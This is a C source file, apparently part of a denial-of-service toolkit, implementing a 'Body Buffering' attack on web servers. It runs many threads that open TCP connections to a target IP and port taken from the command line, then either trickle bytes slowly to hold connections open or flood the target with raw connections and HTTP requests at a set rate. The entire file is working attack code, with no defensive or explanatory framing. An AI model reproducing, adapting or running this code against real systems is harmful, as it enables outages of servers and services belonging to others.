#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../ddos/body_buffering.h"

unsigned int bodybuffer_total;
unsigned int bodybuffer_produced;
unsigned int bodybuffer_received;

unsigned int bodybuffer_per_second;
unsigned int bodybuffer_duration;
double bodybuffer_elapsed_time;

char *bodybuffer_dest_ip;
char *bodybuffer_src_ip;
int bodybuffer_src_port;
int bodybuffer_dest_port;

int bodybuffer_generated_count;
short bodybuffer_timed_finisher;

clock_t bodybuffer_global_time;
clock_t bodybuffer_global_elapsed_time;

pthread_mutex_t bodybuffer_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t bodybuffer_cond = PTHREAD_COND_INITIALIZER;

char bodybuffer_request[__BODY_BUFFERING_REQUEST_MSG_SIZE__ ];

int *bodybuffer_sockets;
unsigned int bodybuffer_wait_duration = 1.0;
clock_t *bodybuffer_clocks;
unsigned int bodybuffer_current;

int debug_log2 = 0;

void body_buffering_print_usage(int mode) {

	if (mode == 1)
		printf(
				"header buffering Usage : [Src-IP] [Dest-IP] [# thread] [# attacks(0 for INF)] [Src-Port] [Dest-Port] \n");
}

void* generate_body_buffering1(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

	int first_run = 1;
	int sock = -1;
	while (1) {

		pthread_mutex_lock(&bodybuffer_mutex);
		thread_clock = clock();

		//making tcp connection

		if (first_run == 1) {
			sock = socket(AF_INET, SOCK_STREAM, 0);
			if (sock == -1)
				perror("sock creation failed\n");

			struct sockaddr_in servaddr;
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = inet_addr(bodybuffer_dest_ip);
			servaddr.sin_port = htons(bodybuffer_dest_port);

			if (connect(sock, (struct sockaddr*) &servaddr, sizeof(servaddr))
					!= 0)
				perror("connect failed\n");

			/*sock = tcp_make_connection(inet_addr(bodybuffer_src_ip),
			 inet_addr(bodybuffer_dest_ip), bodybuffer_src_port,
			 bodybuffer_dest_port, SOCK_STREAM);
			 bodybuffer_src_port ++;
			 first_run = 0;
			 printf("Sock : %d\n",sock);
			 */
			char http_request[] =
					"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";
			if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
				perror("get send err\n");
			}
			printf("Get Sent\n");

			first_run = 0;
		}

		double elapsed_time = ((double) (thread_clock - bodybuffer_global_time))
				/ CLOCKS_PER_SEC;

		if (elapsed_time < 10.0) {
			pthread_cond_wait(&bodybuffer_cond, &bodybuffer_mutex);
		}

		int sent_size = -9999;
		char data[] = "a\r\n";

		sent_size =write(sock, &data, strlen(data));

		//printf("Sent : %d\n", sent_size);

		pthread_cond_signal(&bodybuffer_cond);
		pthread_mutex_unlock(&bodybuffer_mutex);
	}

	return 0;

}

void* generate_body_buffering2(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

	int sock;
	while (1) {

		pthread_mutex_lock(&bodybuffer_mutex);
		thread_clock = clock();
		bodybuffer_elapsed_time = ((double) (thread_clock
				- bodybuffer_global_elapsed_time)) / CLOCKS_PER_SEC;

		if (bodybuffer_elapsed_time >= bodybuffer_duration) {
			pthread_mutex_unlock(&bodybuffer_mutex);
			pthread_cond_broadcast(&bodybuffer_cond);
			bodybuffer_timed_finisher = 1;
			return 0;
		}

		if (bodybuffer_produced >= bodybuffer_per_second) {
			pthread_cond_wait(&bodybuffer_cond, &bodybuffer_mutex);
		}

		int sock = tcp_make_connection(inet_addr(bodybuffer_src_ip),
				inet_addr(bodybuffer_dest_ip), bodybuffer_src_port,
				bodybuffer_dest_port, SOCK_PACKET);
		bodybuffer_src_port++;
		if (bodybuffer_src_port >= 65000)
			bodybuffer_src_port = 10000;

		send(sock, bodybuffer_request, __BODY_BUFFERING_REQUEST_MSG_SIZE__, 0);

		bodybuffer_produced++;
		bodybuffer_total++;
		bodybuffer_generated_count++;

		pthread_cond_signal(&bodybuffer_cond);
		close(sock);
		pthread_mutex_unlock(&bodybuffer_mutex);

	}

	return 0;
}

void* bodybuffer_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1;
	t1 = clock();
	bodybuffer_global_elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&bodybuffer_mutex);

		bodybuffer_global_time = clock();
		bodybuffer_elapsed_time = ((double) (bodybuffer_global_time
				- bodybuffer_global_elapsed_time)) / CLOCKS_PER_SEC;
		if (bodybuffer_timed_finisher == 1)
			return 0;
		time_taken = ((double) (bodybuffer_global_time - t1)) / CLOCKS_PER_SEC;

		if (time_taken >= 1.0) {
			bodybuffer_produced = 0;
			t1 = clock();
			time_taken = 0;
			pthread_cond_signal(&bodybuffer_cond);
		}
		pthread_mutex_unlock(&bodybuffer_mutex);
	}
}

void body_buffering_run(char *argv[], int mode) {

	// TO BE FIXED LATER
	/*
	 FILE *get_f;

	 get_f = fopen("./src/ddos/http_request.txt", "rb");
	 if (get_f == NULL) {
	 perror("open error! does http_get_request.txt exist?\n");
	 exit(1);
	 }
	 char buffer[__BODY_BUFFERING_REQUEST_MSG_SIZE__ ];
	 while (fgets(buffer, __BODY_BUFFERING_REQUEST_MSG_SIZE__, get_f) != NULL) {
	 strcat(bodybuffer_request, buffer);
	 strcat(bodybuffer_request, "\r\n");
	 }
	 strcat(bodybuffer_request, "\r\n");

	 printf("HTTP header msg:\n%s\n", bodybuffer_request);
	 fclose(get_f);
	 */

	strcpy(bodybuffer_request,
			"GET / HTTP/1.1\r\nHost: http://www.examplewebsitenotexisting.com\r\n");

	bodybuffer_src_ip = (char*) malloc(sizeof(char) * 20);
	bodybuffer_dest_ip = (char*) malloc(sizeof(char) * 20);
	int argc = 0;
	bodybuffer_generated_count = 0;
	bodybuffer_timed_finisher = 0;
	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 6) {
		body_buffering_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 7) {
		body_buffering_print_usage(mode);
		return;
	}

	strcpy(bodybuffer_src_ip, argv[0]);

	bodybuffer_produced = 0;
	if (mode == 1) {
		bodybuffer_total = atoi(argv[3]);
		bodybuffer_src_port = atoi(argv[4]);

		//socket preparation & clock preparation
		bodybuffer_sockets = (int*) malloc(sizeof(int) * bodybuffer_total);

		bodybuffer_clocks = (clock_t*) malloc(
				sizeof(clock_t) * bodybuffer_total);

		bodybuffer_current = 0;

		int tmp;
		for (tmp = 0; tmp < bodybuffer_total; tmp++) {
			bodybuffer_sockets[tmp] = -2;
			bodybuffer_clocks[tmp] = clock();
		}

		bodybuffer_dest_port = atoi(argv[5]);

		if (bodybuffer_total == 0)
			bodybuffer_total = __UINT_MAXIMUM__;

	}

	if (mode == 2) {
		bodybuffer_total = 0;
		bodybuffer_per_second = atoi(argv[3]);
		bodybuffer_duration = atoi(argv[4]);
		if (bodybuffer_duration == 0)
			bodybuffer_duration = __UINT_MAXIMUM__;

		if (bodybuffer_per_second == 0)
			bodybuffer_per_second = __UINT_MAXIMUM__;

		bodybuffer_src_port = atoi(argv[5]);
		bodybuffer_dest_port = atoi(argv[6]);
	}

	int num_threads = atoi(argv[2]);

	strcpy(bodybuffer_dest_ip, argv[1]);

	int *generate_thread_id, *receive_thread_id;
	pthread_t *generate_thread, *receive_thread;
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Body Buffering attack to %s using %d threads\n", bodybuffer_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_body_buffering1,
					(void*) &generate_thread_id[i]);
		if (mode == 2) {
			printf("thread %d created\n", i);
			pthread_create(&generate_thread[i], NULL, generate_body_buffering2,
					(void*) &generate_thread_id[i]);
			/*RECEIVE THREAD DEACTIVATION*/
			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
		}

	}

	pthread_create(&generate_thread[i], NULL, bodybuffer_time_check,
			(void*) &generate_thread_id[i]);
	num_threads++;

	for (i = 0; i < num_threads; i++) {
		void *status1, *status2;
		pthread_join(generate_thread[i], &status1);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("Body Buffering attack finished.\n");

	pthread_mutex_destroy(&bodybuffer_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(bodybuffer_src_ip);
	free(bodybuffer_dest_ip);
	free(bodybuffer_sockets);
	free(bodybuffer_clocks);
	return;
}
